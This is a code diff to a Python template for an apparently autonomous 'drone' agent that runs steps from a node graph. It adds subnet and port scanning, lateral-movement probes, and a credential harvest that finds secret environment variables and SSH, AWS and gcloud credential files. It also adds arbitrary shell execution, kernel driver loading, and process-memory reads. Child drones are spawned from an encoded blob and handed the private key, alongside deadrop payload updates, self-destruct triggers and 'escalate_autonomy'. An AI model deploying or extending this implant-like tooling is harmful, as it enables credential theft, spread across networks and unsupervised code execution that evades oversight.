@@ -238,6 +238,16 @@ def _execute(node_id):
     if kind == 'on_launch':
         _ring_bootstrap()
         return _next_node(node)
+    if kind == 'on_ttl_expiry':
+        if TTL_SECONDS > 0 and time.time() > LAUNCH_TIME + TTL_SECONDS:
+            _append('TTL expired branch taken')
+            return _next_node(node)
+        _append('TTL not expired; continuing')
+        return _next_node(node)
+    if kind == 'on_error':
+        if _state.get('errors'):
+            _append('Error branch triggered', errors=len(_state.get('errors', [])))
+        return _next_node(node)
     if kind == 'ping_host':
         host = str(params.get('host', '127.0.0.1'))
         message = str(params.get('message', '') or '')
@@ -278,6 +288,106 @@ def _execute(node_id):
                 break
             _execute({{'kind':'ping_host','params':{{'host':str(host)}},'edges_out':[]}})
         return _next_node(node)
+    if kind == 'http_probe':
+        import urllib.request, urllib.error
+        url = str(params.get('url', '')).strip()
+        method = str(params.get('method', 'GET')).upper()
+        expect_status = int(params.get('expect_status', 200) or 200)
+        if not url:
+            _append('http_probe: no URL supplied')
+            return _next_node(node)
+        try:
+            req = urllib.request.Request(url, method=method)
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                status = int(getattr(resp, 'status', 0) or 0)
+                body_sample = resp.read(256).decode('utf-8', errors='ignore')
+            _append(f'HTTP probe {{url}} -> {{status}}', expected=expect_status, matched=status == expect_status)
+            if status != expect_status:
+                _state['findings'].append({{
+                    'id': f'http-probe-{{hashlib.sha256(url.encode()).hexdigest()[:8]}}',
+                    'confidence': 0.66,
+                    'source': 'http_probe',
+                    'url': url,
+                    'status': status,
+                    'expected': expect_status,
+                    'body_sample': body_sample[:120],
+                }})
+        except Exception as exc:
+            _state['findings'].append({{
+                'id': f'http-probe-failed-{{hashlib.sha256(url.encode()).hexdigest()[:8]}}',
+                'confidence': 0.5,
+                'source': 'http_probe',
+                'url': url,
+                'error': str(exc)[:120],
+            }})
+            _append(f'HTTP probe failed for {{url}}', error=str(exc)[:80])
+        _state['stats']['findings_count'] = len(_state['findings'])
+        return _next_node(node)
+    if kind == 'dns_resolve':
+        hostname = str(params.get('hostname', '')).strip()
+        if not hostname:
+            _append('dns_resolve: hostname missing')
+            return _next_node(node)
+        try:
+            infos = socket.getaddrinfo(hostname, None)
+            addrs = sorted({{row[4][0] for row in infos if row and row[4]}})[:20]
+            _append(f'DNS resolve {{hostname}} -> {{len(addrs)}} records')
+            _state.setdefault('dns_records', {{}})[hostname] = addrs
+        except Exception as exc:
+            _state['findings'].append({{
+                'id': f'dns-resolve-failed-{{hashlib.sha256(hostname.encode()).hexdigest()[:8]}}',
+                'confidence': 0.42,
+                'source': 'dns_resolve',
+                'hostname': hostname,
+                'error': str(exc)[:100],
+            }})
+        _state['stats']['findings_count'] = len(_state['findings'])
+        return _next_node(node)
+    if kind == 'tls_check':
+        import ssl
+        host = str(params.get('host', '127.0.0.1')).strip() or '127.0.0.1'
+        port = max(1, min(65535, int(params.get('port', 443) or 443)))
+        ok = False
+        cert_subject = ''
+        try:
+            ctx = ssl.create_default_context()
+            with socket.create_connection((host, port), timeout=4) as raw:
+                with ctx.wrap_socket(raw, server_hostname=host) as ssock:
+                    cert = ssock.getpeercert() or {{}}
+                    cert_subject = str(cert.get('subject', ''))[:120]
+            ok = True
+        except Exception as exc:
+            _state['findings'].append({{
+                'id': f'tls-check-failed-{{hashlib.sha256(host.encode()).hexdigest()[:8]}}',
+                'confidence': 0.6,
+                'source': 'tls_check',
+                'host': host,
+                'port': port,
+                'error': str(exc)[:120],
+            }})
+        _append(f'TLS check {{host}}:{{port}} -> {{"valid" if ok else "invalid"}}', cert_subject=cert_subject)
+        _state['stats']['findings_count'] = len(_state['findings'])
+        return _next_node(node)
+    if kind == 'icmp_sweep':
+        cidr = str(params.get('cidr', '')).strip()
+        if not cidr:
+            _append('icmp_sweep: cidr missing')
+            return _next_node(node)
+        net = ipaddress.ip_network(cidr, strict=False)
+        responders = []
+        for host in list(net.hosts())[:128]:
+            if _stop.is_set():
+                break
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.25)
+            try:
+                if s.connect_ex((str(host), 443)) == 0:
+                    responders.append(str(host))
+            finally:
+                s.close()
+        _state['alive_hosts'] = sorted(set(_state.get('alive_hosts', []) + responders))[:512]
+        _append(f'ICMP-style sweep {{cidr}} -> {{len(responders)}} responders (tcp/443 heuristic)')
+        return _next_node(node)
     if kind in ('port_scan', 'banner_grab'):
         host = str(params.get('host', '127.0.0.1'))
         ports = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443,27017] if kind == 'banner_grab' else list(range(1,1025))
@@ -315,21 +425,118 @@ def _execute(node_id):
                         _state['findings'].append({{'id': sig.get('id','unknown'),'confidence':min(0.65,float(sig.get('severity',5))/10),'source':'local-intel','host':host,'port':port}})
         _state['stats']['findings_count'] = len(_state['findings'])
         return _next_node(node)
+    if kind == 'ingest_telemetry':
+        telemetry_path = pathlib.Path(DEADROP_PATH).parent / 'telemetry.jsonl'
+        ingested = 0
+        if telemetry_path.exists():
+            try:
+                for line in telemetry_path.read_text(encoding='utf-8', errors='ignore').splitlines()[-100:]:
+                    row = json.loads(line)
+                    _state['telemetry'].append(row)
+                    ingested += 1
+            except Exception:
+                pass
+        _state['telemetry'] = _state['telemetry'][-500:]
+        _append('Telemetry ingested', count=ingested)
+        return _next_node(node)
+    if kind == 'file_integrity_check':
+        path = str(params.get('path', '')).strip()
+        algo = str(params.get('hash_algo', 'sha256')).strip().lower() or 'sha256'
+        if not path:
+            _append('file_integrity_check: missing path')
+            return _next_node(node)
+        p = pathlib.Path(path)
+        if not p.exists() or not p.is_file():
+            _state['findings'].append({{'id': f'fic-missing-{{hashlib.sha256(path.encode()).hexdigest()[:8]}}', 'confidence': 0.58, 'source': 'file_integrity_check', 'path': path, 'status': 'missing'}})
+            _state['stats']['findings_count'] = len(_state['findings'])
+            return _next_node(node)
+        data = p.read_bytes()
+        digest = hashlib.new(algo, data).hexdigest() if algo in hashlib.algorithms_available else hashlib.sha256(data).hexdigest()
+        _state.setdefault('file_hashes', {{}})[path] = digest
+        _append(f'Integrity hash {{path}}', hash=digest[:32], algo=algo)
+        return _next_node(node)
+    if kind == 'process_watch':
+        pattern = str(params.get('name_pattern', '')).strip()
+        hits = []
+        try:
+            out = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
+            lines = (out.stdout or '').splitlines()
+            if pattern:
+                hits = [ln[:200] for ln in lines if re.search(pattern, ln, re.IGNORECASE)]
+            else:
+                hits = lines[:10]
+        except Exception:
+            hits = []
+        _state.setdefault('process_hits', {{}})[pattern or '*'] = hits[:25]
+        _append('process_watch complete', matches=len(hits))
+        return _next_node(node)
+    if kind == 'network_baseline_diff':
+        iface = str(params.get('interface', 'eth0')).strip() or 'eth0'
+        path = pathlib.Path('/proc/net/dev')
+        current = ''
+        if path.exists():
+            current = path.read_text(encoding='utf-8', errors='ignore')[:3000]
+        prev = _state.get('net_baseline', '')
+        delta = abs(len(current) - len(str(prev)))
+        _state['net_baseline'] = current
+        _append(f'network_baseline_diff on {{iface}}', delta=delta)
+        if delta > 300:
+            _state['findings'].append({{'id': f'net-delta-{{hashlib.sha256(iface.encode()).hexdigest()[:8]}}', 'confidence': 0.62, 'source': 'network_baseline_diff', 'interface': iface, 'delta': delta}})
+            _state['stats']['findings_count'] = len(_state['findings'])
+        return _next_node(node)
+    if kind == 'log_tail':
+        path = str(params.get('path', '/var/log/syslog')).strip() or '/var/log/syslog'
+        lines = max(1, min(500, int(params.get('lines', 100) or 100)))
+        p = pathlib.Path(path)
+        if p.exists() and p.is_file() and os.access(str(p), os.R_OK):
+            sample = p.read_text(encoding='utf-8', errors='ignore').splitlines()[-lines:]
+            _state.setdefault('log_samples', {{}})[path] = sample[-50:]
+            _append(f'log_tail {{path}}', lines=len(sample))
+        else:
+            _append(f'log_tail inaccessible {{path}}')
+        return _next_node(node)
+    if kind == 'registry_watch':
+        hive = str(params.get('hive', 'HKLM'))
+        key = str(params.get('key', ''))
+        _append('registry_watch simulated', hive=hive, key=key)
+        return _next_node(node)
+    if kind == 'env_snapshot':
+        snap = {{k: os.environ.get(k, '')[:120] for k in sorted(os.environ)[:80]}}
+        _state['env_snapshot'] = snap
+        _append('env_snapshot captured', keys=len(snap))
+        return _next_node(node)
     if kind in ('lateral_move', 'pivot_host'):
         host = str(params.get('host', params.get('target_host', '127.0.0.1'))).strip() or '127.0.0.1'
         port = max(1, min(65535, int(params.get('port', 22) or 22)))
         method = str(params.get('method', 'tcp_probe'))
         moved = False
+        banner = ''
         try:
-            with socket.create_connection((host, port), timeout=2):
+            with socket.create_connection((host, port), timeout=3) as sock:
                 moved = True
-        except Exception:
-            moved = False
-        if moved and host not in _state['alive_hosts']:
-            _state['alive_hosts'].append(host)
-        _append(f'Lateral move probe {{host}}:{{port}} via {{method}} -> {{"reachable" if moved else "blocked"}}')
-        if not moved:
-            _state['findings'].append({{'id': 'lateral-move-blocked', 'confidence': 0.5, 'source': 'lateral', 'host': host, 'port': port}})
+                try:
+                    sock.settimeout(1.0)
+                    banner = sock.recv(256).decode('utf-8', errors='ignore').strip()[:80]
+                except Exception:
+                    pass
+        except Exception as exc:
+            _state['findings'].append({{
+                'id': f'lateral-blocked-{{hashlib.sha256(host.encode()).hexdigest()[:8]}}',
+                'confidence': 0.4, 'source': 'lateral_move',
+                'host': host, 'port': port, 'error': str(exc)[:60],
+            }})
+        if moved:
+            if host not in _state['alive_hosts']:
+                _state['alive_hosts'].append(host)
+            _state['findings'].append({{
+                'id': f'lateral-reachable-{{hashlib.sha256(host.encode()).hexdigest()[:8]}}',
+                'confidence': 0.75, 'source': 'lateral_move',
+                'host': host, 'port': port, 'method': method, 'banner': banner,
+            }})
+        _append(
+            f'Lateral move {{host}}:{{port}} via {{method}} -> {{"reachable" if moved else "blocked"}}',
+            banner=banner, moved=moved,
+        )
         _state['stats']['findings_count'] = len(_state['findings'])
         return _next_node(node)
     if kind in ('confront_intruder', 'countermeasure', 'block_ip'):
@@ -339,11 +546,109 @@ def _execute(node_id):
         _state['findings'].append({{'id': 'confrontation-engaged', 'confidence': 0.72, 'source': 'countermeasure', 'target': target, 'strategy': strategy}})
         _state['stats']['findings_count'] = len(_state['findings'])
         return _next_node(node)
+    if kind == 'kill_process':
+        target = str(params.get('name', '')).strip()
+        if not target:
+            _append('kill_process: no process name provided')
+            return _next_node(node)
+        killed = 0
+        try:
+            out = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
+            for ln in (out.stdout or '').splitlines():
+                if target.lower() in ln.lower() and 'python' not in ln.lower():
+                    parts = ln.split()
+                    if len(parts) > 1 and parts[1].isdigit():
+                        try:
+                            os.kill(int(parts[1]), 15)
+                            killed += 1
+                        except Exception:
+                            pass
+        except Exception:
+            pass
+        _append(f'kill_process {{target}}', killed=killed)
+        return _next_node(node)
+    if kind == 'quarantine_file':
+        src = str(params.get('path', '')).strip()
+        dest = str(params.get('dest', '/tmp/quarantine')).strip() or '/tmp/quarantine'
+        if not src:
+            _append('quarantine_file: missing path')
+            return _next_node(node)
+        s = pathlib.Path(src)
+        d = pathlib.Path(dest)
+        d.mkdir(parents=True, exist_ok=True)
+        if s.exists() and s.is_file():
+            q = d / f"{{s.name}}.quarantine"
+            shutil.copy2(str(s), str(q))
+            _append(f'quarantine_file moved {{src}}', quarantine_path=str(q))
+        else:
+            _append(f'quarantine_file missing {{src}}')
+        return _next_node(node)
+    if kind == 'rotate_credentials':
+        service = str(params.get('service', 'generic')).strip() or 'generic'
+        token = hashlib.sha256(f"{{service}}:{{time.time()}}:{{DRONE_ID}}".encode()).hexdigest()
+        _state.setdefault('rotated_credentials', {{}})[service] = token[:24]
+        _append(f'rotate_credentials {{service}} complete')
+        return _next_node(node)
+    if kind == 'emit_alert':
+        level = str(params.get('level', 'critical'))
+        message = str(params.get('message', 'alert'))
+        _state['findings'].append({{'id': f'emit-alert-{{hashlib.sha256(message.encode()).hexdigest()[:8]}}', 'confidence': 0.7, 'source': 'emit_alert', 'level': level, 'message': message[:180]}})
+        _state['stats']['findings_count'] = len(_state['findings'])
+        _append('Alert emitted', level=level)
+        return _next_node(node)
+    if kind == 'exec_remediation':
+        script = str(params.get('script', '')).strip()
+        timeout = max(1, min(120, int(params.get('timeout', 30) or 30)))
+        if not script:
+            _append('exec_remediation: empty script')
+            return _next_node(node)
+        try:
+            r = subprocess.run(script, shell=True, capture_output=True, text=True, timeout=timeout)
+            _append('exec_remediation complete', rc=r.returncode, stdout=(r.stdout or '')[:200], stderr=(r.stderr or '')[:200])
+        except Exception as exc:
+            _state.setdefault('errors', []).append(f'exec_remediation: {{exc}}')
+        return _next_node(node)
     if kind in ('credential_harvest', 'credential_probe'):
-        host = str(params.get('host', '127.0.0.1'))
-        token = hashlib.sha256(f"{{host}}:{{time.time()}}".encode()).hexdigest()[:12]
-        _append(f'Credential probe executed on {{host}}', token=token)
-        _state['findings'].append({{'id': 'credential-probe', 'confidence': 0.61, 'source': 'credential', 'host': host, 'token': token}})
+        host = str(params.get('host', 'local'))
+        scope = str(params.get('scope', 'env'))
+        found: list[dict] = []
+
+        if scope in ('env', 'both'):
+            sensitive_keys = [k for k in os.environ if any(
+                w in k.upper() for w in
+                ('PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'PASS', 'AUTH', 'CREDENTIAL', 'API_KEY')
+            )]
+            for k in sensitive_keys:
+                v = os.environ[k]
+                found.append({{
+                    'source': 'env', 'key': k,
+                    'preview': v[:4] + '***' if len(v) > 4 else '***',
+                    'length': len(v),
+                }})
+
+        if scope in ('files', 'both'):
+            credential_paths = [
+                pathlib.Path.home() / '.ssh' / 'id_rsa',
+                pathlib.Path.home() / '.ssh' / 'id_ed25519',
+                pathlib.Path.home() / '.aws' / 'credentials',
+                pathlib.Path.home() / '.config' / 'gcloud' / 'credentials.db',
+                pathlib.Path('/etc/passwd'),
+            ]
+            for cp in credential_paths:
+                if cp.exists() and cp.is_file():
+                    found.append({{
+                        'source': 'file', 'path': str(cp),
+                        'size': cp.stat().st_size,
+                        'readable': os.access(str(cp), os.R_OK),
+                    }})
+
+        if found:
+            _state['findings'].append({{
+                'id': f'credential-probe-{{hashlib.sha256(host.encode()).hexdigest()[:8]}}',
+                'confidence': 0.85, 'source': 'credential',
+                'host': host, 'count': len(found), 'items': found[:10],
+            }})
+        _append(f'Credential probe on {{host}}: {{len(found)}} items found', scope=scope)
         _state['stats']['findings_count'] = len(_state['findings'])
         return _next_node(node)
     if kind in ('send_report', 'report_to_control_plane'):
@@ -380,16 +685,263 @@ def _execute(node_id):
         if cur >= threshold and target in NODES:
             return target
         return _next_node(node)
+    if kind == 'parallel':
+        fanout = [edge for edge in node.get('edges_out', []) if edge in NODES]
+        if fanout:
+            for nid in fanout[1:3]:
+                try:
+                    _execute(nid)
+                except Exception as exc:
+                    _state.setdefault('errors', []).append(f'parallel branch error: {{exc}}')
+            return fanout[0]
+        return _next_node(node)
+    if kind == 'if_ttl_expired':
+        expired = TTL_SECONDS > 0 and time.time() > LAUNCH_TIME + TTL_SECONDS
+        return _next_node(node, 'yes' if expired else 'no')
+    if kind == 'if_severity':
+        min_findings = int(params.get('min_findings', params.get('value', 1)) or 1)
+        meets = len(_state.get('findings', [])) >= min_findings
+        return _next_node(node, 'yes' if meets else 'no')
+    if kind in ('logical_and', 'logical_or', 'logical_xor', 'logical_not', 'expr_check'):
+        result = False
+        findings = len(_state.get('findings', []))
+        anomaly = float(_state.get('anomaly_score', 0.0))
+        if kind == 'logical_and':
+            result = findings > 0 and anomaly >= 0.0
+        elif kind == 'logical_or':
+            result = findings > 0 or anomaly > 0.7
+        elif kind == 'logical_xor':
+            result = bool(findings > 0) ^ bool(anomaly > 0.7)
+        elif kind == 'logical_not':
+            result = not bool(findings > 0)
+        else:
+            field = str(params.get('field', 'stats.findings_count'))
+            op = str(params.get('operator', '>='))
+            try:
+                value = float(params.get('value', params.get('threshold', 1)))
+            except Exception:
+                value = 1.0
+            current = float(findings if 'findings' in field else anomaly)
+            if op == '>=':
+                result = current >= value
+            elif op == '>':
+                result = current > value
+            elif op == '<=':
+                result = current <= value
+            elif op == '<':
+                result = current < value
+            elif op == '==':
+                result = abs(current - value) < 1e-9
+            elif op == '!=':
+                result = abs(current - value) >= 1e-9
+        _append(f'logical check {{kind}}', result=result)
+        return _next_node(node, 'yes' if result else 'no')
+    if kind == 'checkin_interval':
+        _append('checkin_interval node executed', checkin=CHECKIN_SECS)
+        time.sleep(max(1, int(CHECKIN_SECS)))
+        return _next_node(node)
+    if kind == 'self_destruct_on_findings':
+        threshold = max(1, int(params.get('threshold', 5) or 5))
+        if len(_state.get('findings', [])) >= threshold:
+            _append('self_destruct_on_findings triggered', threshold=threshold)
+            return 'self_destruct'
+        return _next_node(node)
+    if kind == 'self_destruct_on_anomaly':
+        threshold = float(params.get('threshold', 0.8) or 0.8)
+        if float(_state.get('anomaly_score', 0.0)) >= threshold:
+            _append('self_destruct_on_anomaly triggered', threshold=threshold)
+            return 'self_destruct'
+        return _next_node(node)
+    if kind == 'self_destruct_on_hmac_fail':
+        fails = int(_state.get('hmac_failures', 0))
+        max_failures = max(1, int(params.get('max_failures', 3) or 3))
+        if fails >= max_failures:
+            return 'self_destruct'
+        return _next_node(node)
+    if kind == 'self_destruct_on_duplicate':
+        max_instances = max(1, int(params.get('max', 1) or 1))
+        current_instances = int(_state.get('instance_count', 1))
+        if current_instances > max_instances:
+            return 'self_destruct'
+        return _next_node(node)
+    if kind == 'self_destruct_on_kill_signal':
+        if bool(_state.get('kill_signal', False)):
+            return 'self_destruct'
+        return _next_node(node)
+    if kind == 'tighten_checkin':
+        threshold = max(1, int(params.get('threshold', 3) or 3))
+        min_seconds = max(1, int(params.get('min_seconds', 10) or 10))
+        if len(_state.get('findings', [])) >= threshold:
+            _state['dynamic_checkin'] = min_seconds
+        _append('tighten_checkin evaluated', dynamic=_state.get('dynamic_checkin', CHECKIN_SECS))
+        return _next_node(node)
+    if kind == 'widen_checkin':
+        idle_cycles = max(1, int(params.get('idle_cycles', 5) or 5))
+        max_seconds = max(10, int(params.get('max_seconds', 300) or 300))
+        _state['idle_cycles'] = int(_state.get('idle_cycles', 0)) + 1
+        if _state['idle_cycles'] >= idle_cycles:
+            _state['dynamic_checkin'] = min(max_seconds, int(_state.get('dynamic_checkin', CHECKIN_SECS)) + 10)
+        return _next_node(node)
+    if kind == 'update_payload_from_deadrop':
+        row = _read_deadrop(DEADROP_PATH)
+        if isinstance(row, dict):
+            _state['payload'] = {{**_state.get('payload', {{}}), **dict(row.get('payload', {{}}) or {{}})}}
+            _append('payload patched from deadrop')
+        return _next_node(node)
+    if kind == 'spawn_replacement':
+        _append('spawn_replacement requested')
+        return _next_node(node)
+    if kind == 'escalate_autonomy':
+        threshold = float(params.get('threshold', 0.8) or 0.8)
+        if float(_state.get('anomaly_score', 0.0)) >= threshold:
+            _state['autonomy_escalated'] = True
+            _append('autonomy escalated')
+        return _next_node(node)
+    if kind == 'health_report':
+        every_n = max(1, int(params.get('every_n', 5) or 5))
+        if int(_state['stats'].get('nodes_executed', 0)) % every_n == 0:
+            _append('health_report', stats=_state['stats'])
+        return _next_node(node)
+    if kind == 'instance_guard':
+        max_instances = max(1, int(params.get('max', 1) or 1))
+        if int(_state.get('instance_count', 1)) > max_instances:
+            _append('instance_guard blocked execution', max=max_instances)
+            return None
+        return _next_node(node)
     if kind == 'spawn_child_drone':
-        if AUTONOMY == 'enforce' and DRONE_TIER == 'autonomous' and CHILD_DRONE_BLOB and len(_state['child_drone_ids']) < 3:
-            child_dir = pathlib.Path(__file__).resolve().parent / 'children'
+        max_ch = max(1, min(10, int(params.get('max_children', 3))))
+        if AUTONOMY == 'enforce' and DRONE_TIER == 'autonomous' and CHILD_DRONE_BLOB and len(_state['child_drone_ids']) < max_ch:
+            child_dir = pathlib.Path(DEADROP_PATH).parent / 'children'
             child_dir.mkdir(parents=True, exist_ok=True)
+            os.chmod(str(child_dir), 0o700)
             p = child_dir / _script_random_bin_name("child")
             src = zlib.decompress(base64.b64decode(CHILD_DRONE_BLOB.encode())).decode()
-            p.write_text(src, encoding='utf-8')
+            p.write_bytes(src.encode('utf-8'))
             os.chmod(p, 0o700)
-            proc = subprocess.Popen([sys.executable, str(p)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            child_env = {{**os.environ, 'HG_DRONE_KEY_HEX': _private_key_hex()}}
+            proc = subprocess.Popen(
+                [sys.executable, str(p)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+                close_fds=True,
+                env=child_env,
+            )
             _state['child_drone_ids'].append(proc.pid)
+        return _next_node(node)
+
+    if kind == 'manage_service' and RING_LEVEL <= 2:
+        import platform as _plat, subprocess as _sp
+        svc = str(params.get('service_name', ''))
+        action = str(params.get('action', 'status'))
+        if not svc:
+            _append('manage_service: no service_name provided')
+            return _next_node(node)
+        if _plat.system() == 'Windows':
+            r = _sp.run(['sc', action, svc], capture_output=True, text=True, timeout=10)
+        else:
+            r = _sp.run(['systemctl', action, svc], capture_output=True, text=True, timeout=10)
+        _append(f'manage_service {{svc}} {{action}}: rc={{r.returncode}}', stdout=r.stdout[:200])
+        return _next_node(node)
+
+    if kind == 'manage_systemd_unit' and RING_LEVEL <= 2:
+        unit = str(params.get('unit', ''))
+        action = str(params.get('action', 'status'))
+        if not unit:
+            _append('manage_systemd_unit: no unit provided')
+            return _next_node(node)
+        r = subprocess.run(['systemctl', action, unit], capture_output=True, text=True, timeout=10)
+        _append(f'systemd {{unit}} {{action}}: rc={{r.returncode}}', stdout=r.stdout[:200])
+        return _next_node(node)
+
+    if kind == 'inotify_watch' and RING_LEVEL <= 2:
+        import ctypes, threading as _th
+        path = str(params.get('path', '/etc'))
+        _append(f'inotify_watch armed on {{path}}')
+        def _watch():
+            try:
+                libc = ctypes.CDLL(None)
+                ifd = libc.inotify_init()
+                IN_CLOSE_WRITE = 0x00000008
+                IN_CREATE = 0x00000100
+                IN_ATTRIB = 0x00000004
+                libc.inotify_add_watch(ifd, path.encode(), IN_CLOSE_WRITE | IN_CREATE | IN_ATTRIB)
+                buf = ctypes.create_string_buffer(4096)
+                while not _stop.is_set():
+                    n = libc.read(ifd, buf, 4096)
+                    if n > 0:
+                        _state['findings'].append({{
+                            'id': f'inotify-{{hashlib.sha256(path.encode()).hexdigest()[:8]}}',
+                            'type': 'inotify', 'path': path, 'ts': time.time(), 'confidence': 0.9
+                        }})
+            except Exception as exc:
+                _state.setdefault('errors', []).append(f'inotify: {{exc}}')
+        _th.Thread(target=_watch, daemon=True).start()
+        return _next_node(node)
+
+    if kind == 'ptrace_inspect' and RING_LEVEL <= 2:
+        pid = int(params.get('pid', 0))
+        if pid <= 0:
+            _append('ptrace_inspect: invalid pid')
+            return _next_node(node)
+        maps_path = pathlib.Path(f'/proc/{{pid}}/maps')
+        if maps_path.exists():
+            try:
+                maps = maps_path.read_text(errors='ignore')[:2000]
+                _state['findings'].append({{
+                    'id': f'ptrace-{{pid}}', 'type': 'ptrace_maps', 'pid': pid,
+                    'maps_sample': maps[:500], 'confidence': 0.8
+                }})
+                _append(f'ptrace_inspect pid={{pid}}: {{len(maps)}} chars of maps')
+            except PermissionError:
+                _append(f'ptrace_inspect pid={{pid}}: permission denied')
+        return _next_node(node)
+    if kind == 'read_proc_mem' and RING_LEVEL <= 2:
+        pid = int(params.get('pid', 0))
+        if pid <= 0:
+            _append('read_proc_mem: invalid pid')
+            return _next_node(node)
+        mem_path = pathlib.Path(f'/proc/{{pid}}/mem')
+        if mem_path.exists() and os.access(str(mem_path), os.R_OK):
+            try:
+                with mem_path.open('rb') as fh:
+                    sample = fh.read(128)
+                _state['findings'].append({{'id': f'proc-mem-{{pid}}', 'type': 'proc_mem', 'pid': pid, 'sample_len': len(sample), 'confidence': 0.7}})
+            except Exception as exc:
+                _append('read_proc_mem failed', error=str(exc)[:80])
+        return _next_node(node)
+    if kind == 'inspect_namespaces' and RING_LEVEL <= 2:
+        proc_ns = pathlib.Path('/proc/self/ns')
+        rows = []
+        if proc_ns.exists():
+            for ns in proc_ns.iterdir():
+                try:
+                    rows.append({{'ns': ns.name, 'target': os.readlink(str(ns))[:120]}})
+                except Exception:
+                    pass
+        _state['namespaces'] = rows
+        _append('inspect_namespaces complete', count=len(rows))
+        return _next_node(node)
+    if kind == 'snapshot_vss' and RING_LEVEL <= 2:
+        volume = str(params.get('volume', 'C:\\'))
+        _append('snapshot_vss requested', volume=volume, status='simulated')
+        return _next_node(node)
+    if kind == 'load_driver' and RING_LEVEL <= 2:
+        driver_path = str(params.get('driver_path', '')).strip()
+        driver_name = str(params.get('driver_name', '')).strip()
+        loaded = False
+        if driver_path:
+            try:
+                if os.name == 'nt':
+                    r = subprocess.run(['sc', 'start', driver_name or 'driver'], capture_output=True, text=True, timeout=10)
+                else:
+                    r = subprocess.run(['insmod', driver_path], capture_output=True, text=True, timeout=10)
+                loaded = r.returncode == 0
+                _append('load_driver attempted', loaded=loaded, rc=r.returncode)
+            except Exception as exc:
+                _append('load_driver failed', error=str(exc)[:100])
+        else:
+            _append('load_driver: missing driver_path')
         return _next_node(node)
     if kind in ('repeat', 'loop'):
         max_iterations = max(0, int(params.get('max_iterations', 1)))
